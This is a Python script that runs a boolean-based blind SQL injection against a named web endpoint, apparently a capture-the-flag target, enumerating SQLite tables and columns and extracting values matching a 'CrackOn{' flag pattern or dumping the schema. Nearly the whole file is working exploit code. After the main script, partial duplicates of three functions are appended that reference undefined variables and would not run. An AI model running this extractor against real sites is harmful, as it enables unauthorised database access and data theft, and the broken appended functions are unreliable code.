#!/usr/bin/env python3
"""
Blind SQLi extractor for https://web2.crack-on.live/profile?id=
Uses the boolean response channel: "User exists" vs "User not found".
"""

from __future__ import annotations

import sys
import time
import urllib.parse
import urllib.request

BASE_URL = "https://web2.crack-on.live/profile?id="
TRUE_MARKER = "User exists"

# Restrict to printable ASCII for faster extraction.
MIN_CODEPOINT = 32
MAX_CODEPOINT = 126

REQUEST_DELAY_SECONDS = 0.03
TIMEOUT_SECONDS = 15


def is_true(condition_sql: str) -> bool:
    payload = f"1 AND ({condition_sql})"
    url = BASE_URL + urllib.parse.quote(payload, safe="")
    req = urllib.request.Request(url, method="GET")
    with urllib.request.urlopen(req, timeout=TIMEOUT_SECONDS) as resp:
        body = resp.read().decode("utf-8", errors="ignore")
    time.sleep(REQUEST_DELAY_SECONDS)
    return TRUE_MARKER in body


def get_number(sql_expr: str, max_value: int = 200) -> int:
    low, high = 0, max_value
    while low < high:
        mid = (low + high + 1) // 2
        if is_true(f"({sql_expr}) >= {mid}"):
            low = mid
        else:
            high = mid - 1
    return low


def get_length(sql_expr: str, max_len: int = 200) -> int:
    return get_number(f"length(({sql_expr}))", max_len)


def get_char_code(sql_expr: str, position: int) -> int:
    low, high = MIN_CODEPOINT, MAX_CODEPOINT
    while low < high:
        mid = (low + high + 1) // 2
        if is_true(f"unicode(substr(({sql_expr}),{position},1)) >= {mid}"):
            low = mid
        else:
            high = mid - 1
    return low


def get_string(sql_expr: str, max_len: int = 120) -> str:
    length = get_length(sql_expr, max_len=max_len)
    out = []
    for pos in range(1, length + 1):
        code = get_char_code(sql_expr, pos)
        out.append(chr(code))
        if pos % 8 == 0 or pos == length:
            print(f"  extracted {pos}/{length}: {''.join(out)}", flush=True)
    return "".join(out)


def qident(identifier: str) -> str:
    # SQLite identifier quoting
    return '"' + identifier.replace('"', '""') + '"'


def list_tables() -> list[str]:
    count_expr = "SELECT count(name) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'"
    count = get_number(count_expr, max_value=80)
    print(f"[+] table count: {count}")
    tables = []
    for i in range(count):
        expr = (
            "SELECT name FROM sqlite_master "
            "WHERE type='table' AND name NOT LIKE 'sqlite_%' "
            f"ORDER BY name LIMIT 1 OFFSET {i}"
        )
        name = get_string(expr, max_len=80)
        tables.append(name)
        print(f"[+] table[{i}] = {name}")
    return tables


def list_columns(table: str) -> list[str]:
    safe_table = table.replace("'", "''")
    count_expr = f"SELECT count(name) FROM pragma_table_info('{safe_table}')"
    count = get_number(count_expr, max_value=80)
    cols = []
    for i in range(count):
        expr = f"SELECT name FROM pragma_table_info('{safe_table}') ORDER BY cid LIMIT 1 OFFSET {i}"
        col = get_string(expr, max_len=80)
        cols.append(col)
    print(f"[+] columns[{table}] = {cols}")
    return cols


def try_extract_flag_from_column(table: str, column: str) -> str | None:
    t = qident(table)
    c = qident(column)
    cond = f"EXISTS(SELECT 1 FROM {t} WHERE CAST({c} AS TEXT) LIKE 'CrackOn{{%')"
    if not is_true(cond):
        return None
    print(f"[+] potential flag match in {table}.{column}")
    expr = f"SELECT CAST({c} AS TEXT) FROM {t} WHERE CAST({c} AS TEXT) LIKE 'CrackOn{{%' LIMIT 1"
    value = get_string(expr, max_len=200)
    return value


def main() -> int:
    print("[+] validating injection channel")
    if not is_true("1=1") or is_true("1=2"):
        print("[-] boolean channel check failed")
        return 1

    print("[+] enumerating tables")
    tables = list_tables()

    # Prioritize likely sensitive tables first.
    priority = sorted(
        tables,
        key=lambda x: (
            0
            if any(k in x.lower() for k in ("flag", "secret", "admin", "power", "plant", "hidden"))
            else 1,
            x,
        ),
    )

    for table in priority:
        cols = list_columns(table)
        for col in cols:
            flag = try_extract_flag_from_column(table, col)
            if flag:
                print(f"\n[FLAG] {flag}")
                return 0

    print("[-] direct CrackOn{ pattern not found; dumping schema SQL for manual follow-up")
    sql_count_expr = "SELECT count(name) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'"
    sql_count = get_number(sql_count_expr, max_value=80)
    for i in range(sql_count):
        expr = (
            "SELECT sql FROM sqlite_master "
            "WHERE type='table' AND name NOT LIKE 'sqlite_%' "
            f"ORDER BY name LIMIT 1 OFFSET {i}"
        )
        sql_def = get_string(expr, max_len=300)
        print(f"[SCHEMA {i}] {sql_def}")

    return 2


if __name__ == "__main__":
    sys.exit(main())



def is_true(condition_sql: str) -> bool:
    payload = f"1 AND ({condition_sql})"
    url = BASE_URL + urllib.parse.quote(payload, safe="")
    with urllib.request.urlopen(req, timeout=TIMEOUT_SECONDS) as resp:
        body = resp.read().decode("utf-8", errors="ignore")
    return TRUE_MARKER in body

def get_string(sql_expr: str, max_len: int = 120) -> str:
    length = get_length(sql_expr, max_len=max_len)
    out = []
    for pos in range(1, length + 1):
        code = get_char_code(sql_expr, pos)
        out.append(chr(code))
    return "".join(out)

def try_extract_flag_from_column(table: str, column: str) -> str | None:
    cond = f"EXISTS(SELECT 1 FROM {t} WHERE CAST({c} AS TEXT) LIKE 'CrackOn{{%')"
    if not is_true(cond):
        return None
    expr = f"SELECT CAST({c} AS TEXT) FROM {t} WHERE CAST({c} AS TEXT) LIKE 'CrackOn{{%' LIMIT 1"
    value = get_string(expr, max_len=200)
    return value